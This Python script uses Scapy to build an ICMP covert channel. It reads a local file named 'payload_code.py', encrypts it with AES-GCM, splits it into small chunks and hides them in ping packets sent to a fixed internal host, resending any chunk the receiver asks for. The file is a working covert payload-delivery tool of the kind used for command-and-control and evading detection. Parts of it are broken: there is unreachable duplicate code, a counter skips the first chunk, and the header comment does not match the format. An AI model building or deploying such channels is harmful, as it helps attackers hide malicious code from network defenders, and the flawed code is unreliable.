import logging
import os
import threading
import time

import rsa
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from prompt_toolkit import PromptSession, print_formatted_text, prompt
from prompt_toolkit.patch_stdout import patch_stdout
from scapy.all import *

session = PromptSession()

# WARN: removes the MAC address not found etc ...
# silence only Scapy‐runtime warnings (leave other logs intact)
logging.getLogger("scapy.runtime").setLevel(
    logging.ERROR)  # or logging.CRITICAL

MAX_MESSAGE_SIZE = 40
FILLER_STRING = "\00"

full_chunks = {}

with open("aes_key.bin", "rb") as key_file:
    symkey = key_file.read()


def sniff_icmp():

    def handle_recv(packet):
        if packet[ICMP].type == 0:
            print(packet)
            return

        packet_recv_data = packet[Raw].load.decode()
        message_code = int(packet_recv_data[0])
        if message_code == 9:
            chunk_id = int(packet_recv_data[1:])
            send_icmp(full_chunks[chunk_id])

        print_formatted_text("Message recieved:", packet[Raw].load)

    fil = "src host 10.0.0.212 and icmp"
    sniff(filter=fil, prn=handle_recv)


TYPE_MESSAGE_ID = 3


def get_payload_chunks() -> list[bytes]:
    with open("payload_code.py", "r") as f:
        payload = f.read()
        encrypted_payload = encrypt_payload(payload)
        chunks = []
        chunk_index = 0
        i = 0
        # splits chunks into 40 bytes including the pre data headers
        while True:
            pre_data = f"{TYPE_MESSAGE_ID}{chunk_index}{FILLER_STRING}"
            true_size = MAX_MESSAGE_SIZE - len(pre_data)
            chunk = encrypted_payload[i:i + true_size]
            final_chunk = pre_data.encode() + chunk
            print(chunk)
            if chunk == b"":
                break
            chunks.append(final_chunk)
            full_chunks[chunk_index] = final_chunk
            i += true_size
            chunk_index += 1
        return chunks
        for i in range(0, len(encrypted_payload) + 1, MAX_MESSAGE_SIZE):
            pre_data = f"{TYPE_MESSAGE_ID}{chunk_index}"
            chunk = pre_data.encode() + encrypted_payload[i:i +
                                                          MAX_MESSAGE_SIZE]
            # if len(chunk) < MAX_MESSAGE_SIZE:
            #     # add filler
            #     chunk += FILLER_STRING * (MAX_MESSAGE_SIZE - len(chunk))
            chunks.append(chunk)
            chunk_index += 1

        return chunks


icmp_seq = 1


def send_icmp(data: bytes):
    global icmp_seq

    # the id comes from the current process id and doing a Internet checksum (used to identify the "session" or "process" sending the ping)
    icmp_id = os.getpid() & 0xFFFF
    # seq increments per sent packet, helps detect packet loss, track individual requests

    icmp_packet = IP(dst="10.0.0.212") / ICMP(id=icmp_id,
                                              seq=icmp_seq) / Raw(load=data)

    resp = sr1(icmp_packet, verbose=0, timeout=3)

    icmp_seq += 1
    if resp:
        return resp
    else:
        return None


def encrypt_payload(data: str) -> bytes:
    aesgcm = AESGCM(symkey)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, data.encode(), associated_data=None)
    complete_ciphertext = nonce + ciphertext
    return complete_ciphertext


# [1 message_type][x chunk_index][x total_chunks][x encrypted_payload_chunk] : Total 40

test = 0


def handle_message():
    global test
    payload_chunks = get_payload_chunks()

    for chunk in payload_chunks:
        if test == 0:
            test += 1
            continue

        resp = send_icmp(chunk)
        if resp is not None:
            print(resp)
        else:
            print("packet lost")

    # while True:
    #     data = session.prompt(">")
    #     aesgcm = AESGCM(symkey)
    #     nonce = os.urandom(12)
    #     ciphertext = aesgcm.encrypt(nonce, data.encode(), associated_data=None)
    #     complete_ciphertext = nonce + ciphertext
    #     send_icmp(complete_ciphertext)


sniffing_thread = threading.Thread(target=sniff_icmp)
message_thread = threading.Thread(target=handle_message)
sniffing_thread.start()
message_thread.start()
